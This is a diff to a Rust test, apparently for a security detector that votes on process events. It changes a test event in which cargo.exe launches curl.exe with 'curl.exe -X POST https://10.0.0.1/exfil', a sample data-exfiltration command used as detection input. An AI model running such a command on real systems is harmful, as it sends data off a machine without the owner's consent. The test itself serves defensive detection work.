@@ -834,7 +834,7 @@ mod tests {
         let ev4 = create_test_event(
             "C:\\Users\\user\\.cargo\\bin\\cargo.exe",
             "C:\\Windows\\System32\\curl.exe",
-            "curl.exe -X POST http://10.0.0.1/exfil",
+            "curl.exe -X POST https://10.0.0.1/exfil",
             pid,
         );
         let vote4 = voter.evaluate_event(&ev4);
